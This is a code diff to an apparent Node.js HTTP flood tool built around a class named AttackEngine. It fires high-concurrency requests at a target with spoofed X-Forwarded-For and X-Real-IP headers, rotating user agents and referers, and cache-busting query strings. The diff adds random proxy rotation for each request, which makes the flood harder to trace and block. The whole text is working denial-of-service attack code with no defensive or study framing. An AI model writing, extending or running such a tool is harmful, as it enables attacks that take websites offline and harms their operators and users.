@@ -5,7 +5,7 @@ const http = require('http');
 const https = require('https');
 const process = require('process');
 
-const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1540); // adjust if needed
+const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1540);
 const REQUEST_TIMEOUT = 8000;
 
 function loadLines(filename) {
@@ -21,6 +21,7 @@ function loadLines(filename) {
 
 const REFERERS = loadLines('refs.txt');
 const USER_AGENTS = loadLines('ua.txt');
+const PROXIES = loadLines('proxies.txt');
 
 const UA_POOL = Array.from({ length: 10000 }, () =>
     USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
@@ -59,7 +60,7 @@ class AttackEngine {
             'Referer': this.getRandomReferer(),
             'X-Forwarded-For': randomIP,
             'X-Real-IP': randomIP,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-US,en;q=0.9',
             'Cache-Control': 'no-cache',
@@ -68,17 +69,24 @@ class AttackEngine {
             'Upgrade-Insecure-Requests': '1'
         };
 
-        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 15)}`;
+        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2, 12)}`;
+
+        const proxyLine = PROXIES[Math.floor(Math.random() * PROXIES.length)];
+        const [host, port] = proxyLine.split(':');
 
         try {
-            const isHttps = this.target.startsWith('https');
             const response = await axios.get(urlWithNoise, {
                 headers,
                 timeout: REQUEST_TIMEOUT,
                 httpAgent: keepAliveHttp,
                 httpsAgent: keepAliveHttps,
-                validateStatus: null
+                validateStatus: null,
+                proxy: {
+                    host,
+                    port: parseInt(port)
+                }
             });
+
             if (response.status === 200) {
                 this.stats.success++;
                 return;
